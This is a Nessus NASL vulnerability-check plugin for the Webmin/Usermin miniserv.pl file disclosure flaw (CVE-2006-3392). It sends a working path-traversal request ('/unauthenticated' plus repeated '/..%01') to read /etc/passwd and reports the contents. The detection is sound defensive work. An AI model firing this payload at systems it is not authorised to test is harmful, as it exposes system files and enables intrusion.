#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server is affected by an information disclosure flaw. 
access. 

Description :

The remote host is running Webmin or Usermin, web-based interfaces for
Unix / Linux system administrators and end-users. 

Webmin and Usermin both come with the Perl script 'miniserv.pl' to
provide basic web services, and the version of 'miniserv.pl' installed
on the remote host contains a logic flaw that allows an
unauthenticated attacker to read arbitrary files on the affected host,
subject to the privileges of the web server user id. 

See also :

http://www.webmin.com/changes-1.290.html
http://www.webmin.com/uchanges-1.220.html

Solution :

Upgrade to Webmin 1.290 / Usermin 1.220 or later. 

Risk factor :

Low / CVSS Base Score : 2 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:N)";


if (description)
{
  script_id(21785);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-3392");
  script_bugtraq_id(18744);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"26772");

  script_name(english:"Webmin / Usermin Arbitrary File Disclosure Vulnerability");
  script_summary(english:"Tries to read a local file using miniserv.pl");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("webmin.nasl");
  script_require_ports("Services/www", 10000);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:10000);
if (!get_port_state(port)) exit(0);
if (!get_kb_item("www/" + port + "/webmin"));
if (http_is_dead(port:port)) exit(0);


# Try to exploit the flaw to read a local file.
file = "/etc/passwd";
req = http_get(
  item:string("/unauthenticated", crap(data:"/..%01", length:60), file),
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);

# There's a problem if there's an entry for root.
if (egrep(pattern:"root:.*:0:[01]:", string:res))
{
  report = string(
    desc,
    "\n\n",
    "Plugin output :\n",
    "\n",
    "Here are the contents of the file '/etc/passwd' that Nessus\n",
    "was able to read from the remote host :\n",
    "\n",
    res
  );
  security_note(port:port, data:report);
}
